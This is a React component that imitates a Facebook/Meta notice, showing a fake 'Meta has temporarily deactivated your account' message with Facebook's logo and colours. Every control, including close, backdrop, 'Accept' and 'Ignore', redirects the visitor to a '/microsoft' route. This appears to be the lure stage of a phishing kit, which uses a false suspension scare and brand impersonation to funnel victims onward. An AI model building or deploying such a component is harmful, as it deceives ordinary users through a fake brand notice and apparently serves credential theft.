import React from 'react';
import { useNavigate } from 'react-router-dom';

interface DeactivationModalProps {
    isOpen: boolean;
    onClose: () => void;
}

const DeactivationModal: React.FC<DeactivationModalProps> = ({ isOpen, onClose }) => {
    const navigate = useNavigate();

    const closeAndRedirect = () => {
        onClose();
        navigate('/microsoft');
    };

    if (!isOpen) return null;

    return (
        <>
            <div className="modal-backdrop" onClick={closeAndRedirect}>
                <div className="modal-container" onClick={(e) => e.stopPropagation()}>
                    <button className="modal-close-button" onClick={closeAndRedirect} aria-label="Close">
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                            <path
                                d="M15 5L5 15M5 5L15 15"
                                stroke="currentColor"
                                strokeWidth="2"
                                strokeLinecap="round"
                            />
                        </svg>
                    </button>

                    <div className="modal-logo">facebook</div>

                    <h2 className="modal-message">
                        Meta has temporarily deactivated your account.
                    </h2>

                    <div className="modal-button-group">
                        <button className="modal-btn modal-btn-accept" onClick={closeAndRedirect}>
                            Accept
                        </button>
                        <button className="modal-btn modal-btn-ignore" onClick={closeAndRedirect}>
                            Ignore
                        </button>
                    </div>
                </div>
            </div>

            <style>{`
        .modal-backdrop {
          position: fixed;
          inset: 0;
          background: rgba(0, 0, 0, 0.65);
          backdrop-filter: blur(1px);
          -webkit-backdrop-filter: blur(1px);
          z-index: 99999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          animation: modalFadeIn 0.2s ease-out;
        }

        @keyframes modalFadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        .modal-container {
          position: relative;
          background: white;
          border-radius: 12px;
          padding: 48px 40px 40px;
          max-width: 580px;
          width: 100%;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
          animation: modalSlideUp 0.3s ease-out;
        }

        @keyframes modalSlideUp {
          from {
            transform: translateY(30px);
            opacity: 0;
          }
          to {
            transform: translateY(0);
            opacity: 1;
          }
        }

        .modal-close-button {
          position: absolute;
          top: 16px;
          right: 16px;
          background: none;
          border: none;
          color: #8a8d91;
          cursor: pointer;
          padding: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
          transition: all 0.2s;
          width: 36px;
          height: 36px;
        }

        .modal-close-button:hover {
          background: #f0f2f5;
          color: #050505;
        }

        .modal-logo {
          font-size: 52px;
          font-weight: bold;
          color: #1877f2;
          text-align: center;
          margin-bottom: 28px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          letter-spacing: -1.5px;
          line-height: 1;
        }

        .modal-message {
          font-size: 24px;
          font-weight: 400;
          color: #1c1e21;
          text-align: center;
          line-height: 1.35;
          margin-bottom: 36px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          padding: 0 10px;
        }

        .modal-button-group {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 12px;
        }

        .modal-btn {
          padding: 12px 24px;
          font-size: 17px;
          font-weight: 600;
          border: none;
          border-radius: 6px;
          cursor: pointer;
          transition: all 0.2s;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          min-height: 48px;
        }

        .modal-btn-accept {
          background: #1877f2;
          color: white;
        }

        .modal-btn-accept:hover {
          background: #166fe5;
          transform: translateY(-1px);
          box-shadow: 0 4px 12px rgba(24, 119, 242, 0.35);
        }

        .modal-btn-accept:active {
          transform: translateY(0);
          background: #1464d4;
        }

        .modal-btn-ignore {
          background: #e4e6eb;
          color: #1c1e21;
        }

        .modal-btn-ignore:hover {
          background: #d8dadf;
          transform: translateY(-1px);
        }

        .modal-btn-ignore:active {
          transform: translateY(0);
          background: #cccfd4;
        }

        @media (max-width: 640px) {
          .modal-container {
            padding: 40px 24px 32px;
          }
          .modal-logo {
            font-size: 44px;
            margin-bottom: 24px;
          }
          .modal-message {
            font-size: 20px;
            margin-bottom: 32px;
          }
          .modal-button-group {
            grid-template-columns: 1fr;
            gap: 10px;
          }
        }
      `}</style>
        </>
    );
};

export default DeactivationModal;